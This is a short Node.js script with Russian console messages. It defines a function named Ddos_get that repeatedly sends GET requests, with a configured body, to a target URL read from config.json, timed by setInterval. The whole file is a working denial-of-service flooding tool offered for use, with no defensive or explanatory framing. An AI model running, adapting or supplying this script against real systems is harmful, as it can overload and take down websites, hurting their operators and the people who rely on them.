var config = require('../config.json')
var request = require('request');
    function Ddos_get(){ try { 
        request({ 
            method:'GET',
            url:config.url,
            body: config.text
        },
        function (error, response, body) {
            if (!error && response.statusCode == 200) {
                console.log("\x1b[35m",'GET запрос отправлен');
            } else {
                console.log("\x1b[31m",'Ошибка GET запроса')
            }
       
        }
    );
} catch(e){
    console.log("\x1b[31m",'Ошибка GET запроса проверьте config.json')
}
} setInterval(Ddos_get, config.time)
